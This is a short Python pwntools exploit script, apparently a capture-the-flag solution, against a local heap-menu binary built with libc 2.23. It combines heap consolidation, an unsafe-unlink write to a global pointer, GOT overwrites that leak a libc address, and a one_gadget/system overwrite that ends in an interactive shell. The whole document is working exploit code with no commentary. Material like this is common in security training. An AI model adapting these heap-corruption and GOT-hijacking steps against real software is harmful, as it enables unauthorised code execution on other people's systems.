from pwn import *
def cmd(c):
	p.sendlineafter("t\n",str(c))
def add(size=0x28,c="\n"):
	cmd(1)
	if (size==0x28):
		t=1
	elif (size==0x208):
		t=2
	p.sendlineafter("e\n",str(t))
	p.sendafter(":\n",c)
def free(c=1):
	cmd(2)
	p.sendlineafter("e\n",str(c))
def edit(size=0x28,c="\n"):
	cmd(3)
	if (size==0x28):
		t=1
	elif (size==0x208):
		t=2
	p.sendlineafter("e\n",str(t))
	p.sendafter(":\n",c)
context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p=process('./pwn')

add(0x28)
add(0x208)
free(1)
cmd("1"*0x400)
free(1)
aim=0x6020d0
edit(0x28,p64(0)+p64(0x21)+p64(aim-0x18)+p64(aim-0x10)+'\x20\n')
free(2)
got=0x000000000602018
puts=0x000000000400740
got2=0x000000000602030
edit(0x28,p64(0x0)*3+p64(got)+p64(got+8))
edit(0x28,p64(puts)+'\n')

free(2)


base=u64(p.readline()[:-1].ljust(8,'\x00'))-libc.sym['puts']

log.warning(hex(base))
libc.address=base
one=base+0x45216
#gdb.attach(p,'b *{}'.format(hex(one)))
edit(0x28,p64(libc.sym['system'])+p64(one)+"\n")


p.interactive('n132>')

